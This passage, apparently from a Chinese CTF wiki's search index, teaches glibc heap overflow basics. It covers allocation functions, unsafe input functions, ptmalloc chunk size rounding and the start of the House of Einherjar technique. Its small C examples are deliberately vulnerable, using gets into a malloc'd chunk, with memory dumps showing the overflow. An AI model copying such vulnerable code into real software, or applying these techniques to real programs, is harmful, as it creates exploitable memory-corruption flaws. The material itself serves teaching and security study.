0x4141414141414141 \u5c0f\u603b\u7ed3 \u00b6 \u5806\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4: \u5bfb\u627e\u5806\u5206\u914d\u51fd\u6570 \u00b6 \u901a\u5e38\u6765\u8bf4\u5806\u662f\u901a\u8fc7\u8c03\u7528 glibc \u51fd\u6570 malloc \u8fdb\u884c\u5206\u914d\u7684\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528 calloc \u5206\u914d\u3002calloc \u4e0e malloc \u7684\u533a\u522b\u662f calloc \u5728\u5206\u914d\u540e\u4f1a\u81ea\u52a8\u8fdb\u884c\u6e05\u7a7a\uff0c\u8fd9\u5bf9\u4e8e\u67d0\u4e9b\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u7684\u5229\u7528\u6765\u8bf4\u662f\u81f4\u547d\u7684 \u3002 calloc(0x20); //\u7b49\u540c\u4e8e ptr=malloc(0x20); memset(ptr,0,0x20); \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u5206\u914d\u662f\u7ecf\u7531 realloc \u8fdb\u884c\u7684\uff0crealloc \u51fd\u6570\u53ef\u4ee5\u8eab\u517c malloc \u548c free \u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u3002 #include <stdio.h> int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0; } realloc\u7684\u64cd\u4f5c\u5e76\u4e0d\u662f\u50cf\u5b57\u9762\u610f\u4e49\u4e0a\u90a3\u4e48\u7b80\u5355\uff0c\u5176\u5185\u90e8\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c \u5f53realloc(ptr,size)\u7684size\u4e0d\u7b49\u4e8eptr\u7684size\u65f6 \u5982\u679c\u7533\u8bf7size>\u539f\u6765size \u5982\u679cchunk\u4e0etop chunk\u76f8\u90bb\uff0c\u76f4\u63a5\u6269\u5c55\u8fd9\u4e2achunk\u5230\u65b0size\u5927\u5c0f \u5982\u679cchunk\u4e0etop chunk\u4e0d\u76f8\u90bb\uff0c\u76f8\u5f53\u4e8efree(ptr),malloc(new_size) \u5982\u679c\u7533\u8bf7size<\u539f\u6765size \u5982\u679c\u76f8\u5dee\u4e0d\u8db3\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk(64\u4f4d\u4e0b32\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e0b16\u4e2a\u5b57\u8282)\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8 \u5982\u679c\u76f8\u5dee\u53ef\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk\uff0c\u5219\u5207\u5272\u539fchunk\u4e3a\u4e24\u90e8\u5206\uff0cfree\u6389\u540e\u4e00\u90e8\u5206 \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8e0\u65f6\uff0c\u76f8\u5f53\u4e8efree(ptr) \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8eptr\u7684size\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c \u5bfb\u627e\u5371\u9669\u51fd\u6570 \u00b6 \u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u5806\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002 \u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b \u8f93\u5165 gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565 '\\x00' scanf vscanf \u8f93\u51fa sprintf \u5b57\u7b26\u4e32 strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230 '\\x00' \u505c\u6b62 strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230 '\\x00' \u505c\u6b62 bcopy \u786e\u5b9a\u586b\u5145\u957f\u5ea6 \u00b6 \u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u5f00\u59cb\u5199\u5165\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb \u3002 \u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u662fmalloc\u7684\u53c2\u6570\u7b49\u4e8e\u5b9e\u9645\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a ptmalloc \u5206\u914d\u51fa\u6765\u7684\u5927\u5c0f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e2a\u957f\u5ea6\u4e00\u822c\u662f\u5b57\u957f\u76842\u500d\uff0c\u6bd4\u598232\u4f4d\u7cfb\u7edf\u662f8\u4e2a\u5b57\u8282\uff0c64\u4f4d\u7cfb\u7edf\u662f16\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u5bf9\u4e8e\u4e0d\u5927\u4e8e2\u500d\u5b57\u957f\u7684\u8bf7\u6c42\uff0cmalloc\u4f1a\u76f4\u63a5\u8fd4\u56de2\u500d\u5b57\u957f\u7684\u5757\u4e5f\u5c31\u662f\u6700\u5c0fchunk\uff0c\u6bd4\u598264\u4f4d\u7cfb\u7edf\u6267\u884c malloc(0) \u4f1a\u8fd4\u56de\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5757\u3002 #include <stdio.h> int main(void) { char *chunk; chunk=malloc(0); puts(\"Get input:\"); gets(chunk); return 0; } //\u6839\u636e\u7cfb\u7edf\u7684\u4f4d\u6570\uff0cmalloc\u4f1a\u5206\u914d8\u621616\u5b57\u8282\u7684\u7528\u6237\u7a7a\u95f4 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 0x602030: 0x0000000000000000 0x0000000000000000 \u6ce8\u610f\u7528\u6237\u533a\u57df\u7684\u5927\u5c0f\u4e0d\u7b49\u4e8e chunk_hear.size\uff0cchunk_hear.size=\u7528\u6237\u533a\u57df\u5927\u5c0f+2*\u5b57\u957f \u8fd8\u6709\u4e00\u70b9\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4f1a\u88ab\u4fee\u6539\uff0c\u5176\u6709\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e\u5176\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\u50a8\u5b58\u5185\u5bb9\u3002\u56de\u5934\u518d\u6765\u770b\u4e0b\u4e4b\u524d\u7684\u793a\u4f8b\u4ee3\u7801 #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } \u89c2\u5bdf\u5982\u4e0a\u4ee3\u7801\uff0c\u6211\u4eec\u7533\u8bf7\u7684chunk\u5927\u5c0f\u662f24\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a64\u4f4d\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5206\u914d\u7684\u5185\u5b58\u4f1a\u662f16\u4e2a\u5b57\u8282\u800c\u4e0d\u662f24\u4e2a\u3002 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u662f\u5982\u4f55\u88c5\u5f97\u4e0b24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5462\uff1f\u7b54\u6848\u662f\u501f\u7528\u4e86\u4e0b\u4e00\u4e2a\u5757\u7684pre_size\u57df\u3002\u6211\u4eec\u53ef\u6765\u770b\u4e00\u4e0b\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0eglibc\u4e2d\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u4e4b\u95f4\u7684\u8f6c\u6362\u3002 /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) \u5f53req=24\u65f6\uff0crequest2size(24)=32\u3002\u800c\u9664\u53bbchunk \u5934\u90e8\u768416\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u4e0a\u7528\u6237\u53ef\u7528chunk\u7684\u5b57\u8282\u6570\u4e3a16\u3002\u800c\u6839\u636e\u6211\u4eec\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u53ef\u4ee5\u77e5\u9053chunk\u7684pre_size\u4ec5\u5f53\u5b83\u7684\u524d\u4e00\u5757\u5757\u5904\u4e8e\u91ca\u653e\u72b6\u6001\u65f6\u624d\u8d77\u4f5c\u7528\u3002\u6240\u4ee5\u7528\u6237\u8fd9\u65f6\u5019\u5176\u5b9e\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\uff0c\u6b63\u597d24\u4e2a\u5b57\u8282\u3002 \u5b9e\u9645\u4e0a ptmalloc \u5206\u914d\u5185\u5b58\u662f\u4ee5\u53cc\u5b57\u4e3a\u57fa\u672c\u5355\u4f4d\uff0c\u4ee564\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5206\u914d\u51fa\u6765\u7684\u7a7a\u95f4\u662f16\u7684\u6574\u6570\u500d\uff0c\u5373\u7528\u6237\u7533\u8bf7\u7684chunk\u90fd\u662f16\u5b57\u8282\u5bf9\u9f50\u7684\u3002","title":"\u5806\u6ea2\u51fa"},{"location":"pwn/heap/heapoverflow_basic/#_1","text":"","title":"\u5806\u6ea2\u51fa"},{"location":"pwn/heap/heapoverflow_basic/#_2","text":"\u5806\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u5411\u67d0\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u5806\u5757\u672c\u8eab\u53ef\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff08 \u4e4b\u6240\u4ee5\u662f\u53ef\u4f7f\u7528\u800c\u4e0d\u662f\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u662f\u56e0\u4e3a\u5806\u7ba1\u7406\u5668\u4f1a\u5bf9\u7528\u6237\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u53ef\u5229\u7528\u7684\u5b57\u8282\u6570\u90fd\u4e0d\u5c0f\u4e8e\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570 \uff09\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u6ea2\u51fa\uff0c\u5e76\u8986\u76d6\u5230 \u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740 \u7684\u4e0b\u4e00\u4e2a\u5806\u5757\u3002 \u4e0d\u96be\u53d1\u73b0\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u53d1\u751f\u7684\u57fa\u672c\u524d\u63d0\u662f \u7a0b\u5e8f\u5411\u5806\u4e0a\u5199\u5165\u6570\u636e\u3002 \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002 \u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002 \u5806\u6ea2\u51fa\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff08\u8fd8\u6709\u6808\u6ea2\u51fa\uff0c bss \u6bb5\u6ea2\u51fa\u7b49)\u3002\u4f46\u662f\u5176\u4e0e\u6808\u6ea2\u51fa\u6240\u4e0d\u540c\u7684\u662f\uff0c\u5806\u4e0a\u5e76\u4e0d\u5b58\u5728\u8fd4\u56de\u5730\u5740\u7b49\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u7684\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5806\u6ea2\u51fa\u6765\u63a7\u5236 EIP \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u5806\u6ea2\u51fa\u7684\u7b56\u7565\u662f \u8986\u76d6\u4e0e\u5176 \u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684\u5185\u5bb9\u3002 prev_size size\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u6bd4\u7279\u4f4d\uff0c\u4ee5\u53ca\u8be5\u5806\u5757\u771f\u6b63\u7684\u5927\u5c0f\u3002 NON_MAIN_ARENA IS_MAPPED PREV_INUSE the True chunk size chunk content\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u56fa\u6709\u7684\u6267\u884c\u6d41\u3002 \u5229\u7528\u5806\u4e2d\u7684\u673a\u5236\uff08\u5982 unlink \u7b49 \uff09\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff08 Write-Anything-Anywhere\uff09\u6216\u63a7\u5236\u5806\u5757\u4e2d\u7684\u5185\u5bb9\u7b49\u6548\u679c\uff0c\u4ece\u800c\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/heapoverflow_basic/#_3","text":"\u4e0b\u9762\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u7528 malloc \u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0c\u4e4b\u540e\u5411\u8fd9\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fc7\u957f\u4f1a\u5bfc\u81f4\u6ea2\u51fa chunk \u7684\u533a\u57df\u5e76\u8986\u76d6\u5230\u5176\u540e\u7684 top chunk \u4e4b\u4e2d(\u5b9e\u9645\u4e0a puts \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u5206\u914d\u5806\u5185\u5b58\uff0c\u8986\u76d6\u5230\u7684\u53ef\u80fd\u5e76\u4e0d\u662f top chunk)\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <===top chunk 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 print 'A'*100 \u8fdb\u884c\u5199\u5165 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 <===top chunk(\u5df2\u88ab\u6ea2\u51fa) 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141","title":"\u57fa\u672c\u793a\u4f8b"},{"location":"pwn/heap/heapoverflow_basic/#_4","text":"\u5806\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/heapoverflow_basic/#_5","text":"\u901a\u5e38\u6765\u8bf4\u5806\u662f\u901a\u8fc7\u8c03\u7528 glibc \u51fd\u6570 malloc \u8fdb\u884c\u5206\u914d\u7684\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528 calloc \u5206\u914d\u3002calloc \u4e0e malloc \u7684\u533a\u522b\u662f calloc \u5728\u5206\u914d\u540e\u4f1a\u81ea\u52a8\u8fdb\u884c\u6e05\u7a7a\uff0c\u8fd9\u5bf9\u4e8e\u67d0\u4e9b\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u7684\u5229\u7528\u6765\u8bf4\u662f\u81f4\u547d\u7684 \u3002 calloc(0x20); //\u7b49\u540c\u4e8e ptr=malloc(0x20); memset(ptr,0,0x20); \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u5206\u914d\u662f\u7ecf\u7531 realloc \u8fdb\u884c\u7684\uff0crealloc \u51fd\u6570\u53ef\u4ee5\u8eab\u517c malloc \u548c free \u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u3002 #include <stdio.h> int main(void) { char *chunk,*chunk1; chunk=malloc(16); chunk1=realloc(chunk,32); return 0; } realloc\u7684\u64cd\u4f5c\u5e76\u4e0d\u662f\u50cf\u5b57\u9762\u610f\u4e49\u4e0a\u90a3\u4e48\u7b80\u5355\uff0c\u5176\u5185\u90e8\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c \u5f53realloc(ptr,size)\u7684size\u4e0d\u7b49\u4e8eptr\u7684size\u65f6 \u5982\u679c\u7533\u8bf7size>\u539f\u6765size \u5982\u679cchunk\u4e0etop chunk\u76f8\u90bb\uff0c\u76f4\u63a5\u6269\u5c55\u8fd9\u4e2achunk\u5230\u65b0size\u5927\u5c0f \u5982\u679cchunk\u4e0etop chunk\u4e0d\u76f8\u90bb\uff0c\u76f8\u5f53\u4e8efree(ptr),malloc(new_size) \u5982\u679c\u7533\u8bf7size<\u539f\u6765size \u5982\u679c\u76f8\u5dee\u4e0d\u8db3\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk(64\u4f4d\u4e0b32\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e0b16\u4e2a\u5b57\u8282)\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8 \u5982\u679c\u76f8\u5dee\u53ef\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk\uff0c\u5219\u5207\u5272\u539fchunk\u4e3a\u4e24\u90e8\u5206\uff0cfree\u6389\u540e\u4e00\u90e8\u5206 \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8e0\u65f6\uff0c\u76f8\u5f53\u4e8efree(ptr) \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8eptr\u7684size\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c","title":"\u5bfb\u627e\u5806\u5206\u914d\u51fd\u6570"},{"location":"pwn/heap/heapoverflow_basic/#_6","text":"\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u5806\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002 \u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b \u8f93\u5165 gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565 '\\x00' scanf vscanf \u8f93\u51fa sprintf \u5b57\u7b26\u4e32 strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230 '\\x00' \u505c\u6b62 strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230 '\\x00' \u505c\u6b62 bcopy","title":"\u5bfb\u627e\u5371\u9669\u51fd\u6570"},{"location":"pwn/heap/heapoverflow_basic/#_7","text":"\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u5f00\u59cb\u5199\u5165\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb \u3002 \u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u662fmalloc\u7684\u53c2\u6570\u7b49\u4e8e\u5b9e\u9645\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a ptmalloc \u5206\u914d\u51fa\u6765\u7684\u5927\u5c0f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e2a\u957f\u5ea6\u4e00\u822c\u662f\u5b57\u957f\u76842\u500d\uff0c\u6bd4\u598232\u4f4d\u7cfb\u7edf\u662f8\u4e2a\u5b57\u8282\uff0c64\u4f4d\u7cfb\u7edf\u662f16\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u5bf9\u4e8e\u4e0d\u5927\u4e8e2\u500d\u5b57\u957f\u7684\u8bf7\u6c42\uff0cmalloc\u4f1a\u76f4\u63a5\u8fd4\u56de2\u500d\u5b57\u957f\u7684\u5757\u4e5f\u5c31\u662f\u6700\u5c0fchunk\uff0c\u6bd4\u598264\u4f4d\u7cfb\u7edf\u6267\u884c malloc(0) \u4f1a\u8fd4\u56de\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5757\u3002 #include <stdio.h> int main(void) { char *chunk; chunk=malloc(0); puts(\"Get input:\"); gets(chunk); return 0; } //\u6839\u636e\u7cfb\u7edf\u7684\u4f4d\u6570\uff0cmalloc\u4f1a\u5206\u914d8\u621616\u5b57\u8282\u7684\u7528\u6237\u7a7a\u95f4 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 0x602030: 0x0000000000000000 0x0000000000000000 \u6ce8\u610f\u7528\u6237\u533a\u57df\u7684\u5927\u5c0f\u4e0d\u7b49\u4e8e chunk_hear.size\uff0cchunk_hear.size=\u7528\u6237\u533a\u57df\u5927\u5c0f+2*\u5b57\u957f \u8fd8\u6709\u4e00\u70b9\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4f1a\u88ab\u4fee\u6539\uff0c\u5176\u6709\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e\u5176\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\u50a8\u5b58\u5185\u5bb9\u3002\u56de\u5934\u518d\u6765\u770b\u4e0b\u4e4b\u524d\u7684\u793a\u4f8b\u4ee3\u7801 #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } \u89c2\u5bdf\u5982\u4e0a\u4ee3\u7801\uff0c\u6211\u4eec\u7533\u8bf7\u7684chunk\u5927\u5c0f\u662f24\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a64\u4f4d\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5206\u914d\u7684\u5185\u5b58\u4f1a\u662f16\u4e2a\u5b57\u8282\u800c\u4e0d\u662f24\u4e2a\u3002 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u662f\u5982\u4f55\u88c5\u5f97\u4e0b24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5462\uff1f\u7b54\u6848\u662f\u501f\u7528\u4e86\u4e0b\u4e00\u4e2a\u5757\u7684pre_size\u57df\u3002\u6211\u4eec\u53ef\u6765\u770b\u4e00\u4e0b\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0eglibc\u4e2d\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u4e4b\u95f4\u7684\u8f6c\u6362\u3002 /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) \u5f53req=24\u65f6\uff0crequest2size(24)=32\u3002\u800c\u9664\u53bbchunk \u5934\u90e8\u768416\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u4e0a\u7528\u6237\u53ef\u7528chunk\u7684\u5b57\u8282\u6570\u4e3a16\u3002\u800c\u6839\u636e\u6211\u4eec\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u53ef\u4ee5\u77e5\u9053chunk\u7684pre_size\u4ec5\u5f53\u5b83\u7684\u524d\u4e00\u5757\u5757\u5904\u4e8e\u91ca\u653e\u72b6\u6001\u65f6\u624d\u8d77\u4f5c\u7528\u3002\u6240\u4ee5\u7528\u6237\u8fd9\u65f6\u5019\u5176\u5b9e\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\uff0c\u6b63\u597d24\u4e2a\u5b57\u8282\u3002 \u5b9e\u9645\u4e0a ptmalloc \u5206\u914d\u5185\u5b58\u662f\u4ee5\u53cc\u5b57\u4e3a\u57fa\u672c\u5355\u4f4d\uff0c\u4ee564\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5206\u914d\u51fa\u6765\u7684\u7a7a\u95f4\u662f16\u7684\u6574\u6570\u500d\uff0c\u5373\u7528\u6237\u7533\u8bf7\u7684chunk\u90fd\u662f16\u5b57\u8282\u5bf9\u9f50\u7684\u3002","title":"\u786e\u5b9a\u586b\u5145\u957f\u5ea6"},{"location":"pwn/heap/house_of_einherjar/","text":"House Of Einherjar \u00b6 \u4ecb\u7ecd \u00b6 house of einherjar \u662f\u4e00\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u7531 Hiroki Matsukuma \u63d0\u51fa\u3002\u8be5\u5806\u5229\u7528\u6280\u672f\u53ef\u4ee5\u5f3a\u5236\u4f7f\u5f97 malloc \u8fd4\u56de\u4e00\u4e2a\u51e0\u4e4e\u4efb\u610f\u5730\u5740\u7684 chunk \u3002\u5176\u4e3b\u8981\u5728\u4e8e\u6ee5\u7528 free \u4e2d\u7684\u540e\u5411\u5408\u5e76\u64cd\u4f5c\uff08\u5408\u5e76\u4f4e\u5730\u5740\u7684chunk\uff09\uff0c\u4ece\u800c\u4f7f\u5f97\u5c3d\u53ef\u80fd\u907f\u514d\u788e\u7247\u5316\u3002 \u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e00\u4e9b\u7279\u6b8a\u5927\u5c0f\u7684\u5806\u5757\u4e2d\uff0coff by one \u4e0d\u4ec5\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 PREV_INUSE \u6bd4\u7279\u4f4d\u3002 \u539f\u7406 \u00b6 \u540e\u5411\u5408\u5e76\u64cd\u4f5c \u00b6 free \u51fd\u6570\u4e2d\u7684\u540e\u5411\u5408\u5e76\u6838\u5fc3\u64cd\u4f5c\u5982\u4e0b /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } \u8fd9\u91cc\u501f\u7528\u539f\u4f5c\u8005\u7684\u4e00\u5f20\u56fe\u7247\u8bf4\u660e \u5173\u4e8e\u6574\u4f53\u7684\u64cd\u4f5c\uff0c\u8bf7\u53c2\u8003 \u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0 \u90a3\u4e00\u7ae0\u8282\u3002 \u5229\u7528\u539f\u7406 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5c31\u4ecb\u7ecd\u8be5\u5229\u7528\u7684\u539f\u7406\u3002\u9996\u5148\uff0c\u5728\u4e4b\u524d\u7684\u5806\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee5\u4e0b\u7684\u77e5\u8bc6 